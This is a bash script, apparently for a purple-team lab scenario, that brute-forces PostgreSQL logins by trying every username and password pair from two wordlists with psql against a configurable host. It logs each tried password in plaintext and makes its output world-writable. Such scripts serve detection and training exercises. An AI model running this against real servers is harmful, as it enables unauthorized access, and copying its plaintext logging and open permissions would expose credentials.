#!/usr/bin/env bash
set -euo pipefail

SCENARIO_DIR="/home/labuser/purple-lab/scenarios/S6"
ENV_FILE="${SCENARIO_DIR}/inputs/target.env"
USERS_FILE="${SCENARIO_DIR}/inputs/users.txt"
PASSWORDS_FILE="${SCENARIO_DIR}/inputs/passwords.txt"
OUTPUT_ROOT="${SCENARIO_DIR}/output"

LAB_OWNER="${LAB_OWNER:-labuser}"
LAB_GROUP="${LAB_GROUP:-labuser}"

source "${ENV_FILE}"

RUN_ID="$(date +%Y%m%d_%H%M%S)"
RUN_DIR="${OUTPUT_ROOT}/${RUN_ID}"
mkdir -p "${RUN_DIR}"

ATTEMPT_LOG="${RUN_DIR}/attempts.log"
SUMMARY_LOG="${RUN_DIR}/summary.log"

echo "[S6] start=$(date -Iseconds)" | tee -a "${SUMMARY_LOG}"
echo "[S6] target=${TARGET_HOST}:${TARGET_PORT}/${TARGET_DB}" | tee -a "${SUMMARY_LOG}"
echo "[S6] users_file=${USERS_FILE}" | tee -a "${SUMMARY_LOG}"
echo "[S6] passwords_file=${PASSWORDS_FILE}" | tee -a "${SUMMARY_LOG}"
echo "[S6] output_dir=${RUN_DIR}" | tee -a "${SUMMARY_LOG}"

attempt=0

while IFS= read -r username; do
  [ -z "${username}" ] && continue

  while IFS= read -r password; do
    [ -z "${password}" ] && continue

    attempt=$((attempt + 1))
    ts="$(date -Iseconds)"

    set +e
    PGPASSWORD="${password}" PGCONNECT_TIMEOUT=3 \
      psql \
      -h "${TARGET_HOST}" \
      -p "${TARGET_PORT}" \
      -U "${username}" \
      -d "${TARGET_DB}" \
      -c "select 1;" \
      > "${RUN_DIR}/response_${attempt}.out" \
      2> "${RUN_DIR}/response_${attempt}.err"
    rc=$?
    set -e

    printf '%s attempt=%s username="%s" password="%s" rc=%s\n' \
      "${ts}" "${attempt}" "${username}" "${password}" "${rc}" \
      | tee -a "${ATTEMPT_LOG}"

    sleep "${SLEEP_SECONDS}"
  done < "${PASSWORDS_FILE}"
done < "${USERS_FILE}"

echo "[S6] total_attempts=${attempt}" | tee -a "${SUMMARY_LOG}"
echo "[S6] end=$(date -Iseconds)" | tee -a "${SUMMARY_LOG}"
echo "${RUN_DIR}" > "${OUTPUT_ROOT}/latest_run_path.txt"

chmod -R a+rwX "${RUN_DIR}" "${OUTPUT_ROOT}/latest_run_path.txt" || true
if id "${LAB_OWNER}" >/dev/null 2>&1; then
  chown -R "${LAB_OWNER}:${LAB_GROUP}" "${RUN_DIR}" "${OUTPUT_ROOT}/latest_run_path.txt" || true
fi
